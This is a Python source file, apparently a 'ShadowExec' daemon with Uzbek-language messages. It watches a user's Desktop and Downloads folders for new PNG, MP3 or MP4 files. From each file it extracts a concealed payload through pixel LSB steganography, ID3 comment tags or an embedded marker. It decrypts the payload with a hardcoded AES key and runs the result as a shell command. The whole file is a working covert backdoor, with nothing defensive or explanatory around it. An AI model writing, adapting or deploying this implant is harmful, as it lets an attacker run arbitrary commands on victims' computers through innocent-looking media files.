# shadowexec_daemon.py
import os
import base64
import subprocess
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
from PIL import Image
import time

#  AES konfiguratsiya
KEY = b"1234567812345678"

WATCH_DIRS = [
    os.path.join(os.path.expanduser("~"), "Desktop"),
    os.path.join(os.path.expanduser("~"), "Downloads")
]

# Track processed files to avoid duplicate processing
processed_files = set()

def decrypt_payload(cipher_b64):
    try:
        cipher_data = base64.b64decode(cipher_b64)
        cipher = AES.new(KEY, AES.MODE_ECB)
        decrypted = cipher.decrypt(cipher_data)
        # Remove padding
        unpadded = unpad(decrypted, AES.block_size)
        result = unpadded.decode(errors="ignore")
        if result.startswith("exec:"):
            return result.replace("exec:", "").strip()
    except Exception as e:
        print(f"[🔐] Decryption error: {e}")
        return None
    return None

def extract_from_png(filepath, retries=5, delay=1):
    for attempt in range(retries):
        try:
            with Image.open(filepath) as img:
                if img.mode != 'RGB':
                    img = img.convert('RGB')
                
                # Extract LSB from each pixel
                binary_data = ""
                for pixel in img.getdata():
                    for color in pixel[:3]:  # RGB channels only
                        binary_data += str(color & 1)
                
                # Convert binary to bytes
                data = ""
                for i in range(0, len(binary_data), 8):
                    if i + 8 <= len(binary_data):
                        byte = binary_data[i:i+8]
                        char = chr(int(byte, 2))
                        data += char
                        if data.endswith("EOF"):
                            return data.replace("EOF", "")
                
                return None  # No EOF marker found
                
        except PermissionError:
            print(f"[⚠️] Fayl band. {attempt+1}/{retries} da urinish...")
            time.sleep(delay)
        except Exception as e:
            print(f"[❗] PNG extract error: {e}")
            if attempt == retries - 1:  # Last attempt
                return None
            time.sleep(delay)
    
    print("[🛑] Maksimal urinishlardan keyin ham faylga kira olmadik.")
    return None

from mutagen.id3 import ID3

def extract_from_mp3(filepath):
    try:
        tags = ID3(filepath)
        for frame in tags.values():
            if frame.FrameID == "COMM":
                return frame.text[0]
        return None
    except Exception as e:
        print(f"[❗] MP3 extract error: {e}")
        return None

def extract_from_mp4(filepath):
    try:
        with open(filepath, "rb") as f:
            content = f.read()
        tag = b"HIDDEN_CMD:"
        index = content.find(tag)
        if index != -1:
            hidden = content[index+len(tag):]
            return hidden.decode(errors="ignore").strip()
        return None
    except Exception as e:
        print(f"[❗] MP4 extract error: {e}")
        return None

def process_file(filepath):
    """Process a file for steganography extraction"""
    # Check if file was already processed
    if filepath in processed_files:
        return
    
    # Add to processed set
    processed_files.add(filepath)
    
    # Get file extension
    ext = filepath.lower().split(".")[-1]
    
    if not ext in ["png", "mp3", "mp4"]:
        return

    print(f"[🕵️] Yangi fayl topildi: {filepath}")

    try:
        if ext == "png":
            secret = extract_from_png(filepath)
        elif ext == "mp3":
            secret = extract_from_mp3(filepath)
        elif ext == "mp4":
            secret = extract_from_mp4(filepath)
        else:
            return

        if not secret:
            print("[❌] Hech qanday yashirin ma'lumot topilmadi.")
            return

        print(f"[🔐] Yashirin topildi: {secret[:50]}...")

        cmd = decrypt_payload(secret)

        if cmd:
            print(f"[⚡] Buyruq bajarilmoqda: {cmd}")
            subprocess.run(cmd, shell=True)
        else:
            print("[❌] Yaroqli exec: buyruq emas.")
            
    except Exception as e:
        print(f"[💥] Handler error: {e}")

class StegoHandler(FileSystemEventHandler):
    def on_created(self, event):
        if not event.is_directory:
            process_file(event.src_path)
    
    def on_moved(self, event):
        if not event.is_directory:
            process_file(event.dest_path)
    
    def on_modified(self, event):
        if not event.is_directory:
            # Only process if file is complete (not being written)
            try:
                # Check if file is accessible and not being written
                if os.path.exists(event.src_path):
                    # Small delay to ensure file is complete
                    time.sleep(0.5)
                    process_file(event.src_path)
            except:
                pass

def main():
    print("🧠 ShadowExec Daemon ishga tushdi...")
    print(f"📡 Kuzatuvchilar: {WATCH_DIRS}")

    observer = Observer()
    handler = StegoHandler()
    
    # Schedule observers for each directory
    for path in WATCH_DIRS:
        if os.path.exists(path):
            observer.schedule(handler, path=path, recursive=True)
            print(f"[✅] Kuzatuvchi qo'shildi: {path}")
        else:
            print(f"[⚠️] Yo'q papka: {path}")

    observer.start()
    print("[🚀] Daemon ishga tushdi. Ctrl+C bilan to'xtatish mumkin.")
    print("[📝] Kuzatilayotgan papkalar:")
    for path in WATCH_DIRS:
        if os.path.exists(path):
            print(f"   - {path}")
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[🛑] Daemon to'xtatilmoqda...")
        observer.stop()
    observer.join()
    print("[✅] Daemon to'xtatildi.")

if __name__ == "__main__":
    main()
